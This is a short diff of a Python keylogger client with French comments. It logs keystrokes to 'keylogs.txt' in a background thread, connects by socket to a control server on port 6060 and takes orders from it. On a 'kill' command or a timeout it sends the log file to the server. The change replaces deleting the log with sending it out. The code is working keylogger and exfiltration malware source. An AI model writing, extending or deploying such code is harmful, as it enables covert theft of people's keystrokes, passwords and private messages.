@@ -40,7 +40,8 @@ def minuteur(dead):
     i = 0
     while message != "kill" :
         if message == "kill" :
-            os.remove(filename)
+            send_file(filename, s)
+            #os.remove(filename)
             break
         elif i == dead:
             break
@@ -68,14 +69,14 @@ filename = "keylogs.txt"
 server_address = "localhost"  # Adresse IP du serveur
 server_port = 6060  # Port du serveur
 message = ""
+log = threading.Thread(target=tracing,daemon=True)
+log.start()
 s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
 s.connect((socket.gethostname(),6060))
 
-log = threading.Thread(target=tracing,daemon=True)
-log.start()
-
 ordre = threading.Thread(target=recep,args=[s],daemon=True)
 ordre.start()
+
 minuteur(10)
 send_file(filename, s)
 #os.remove(filename)
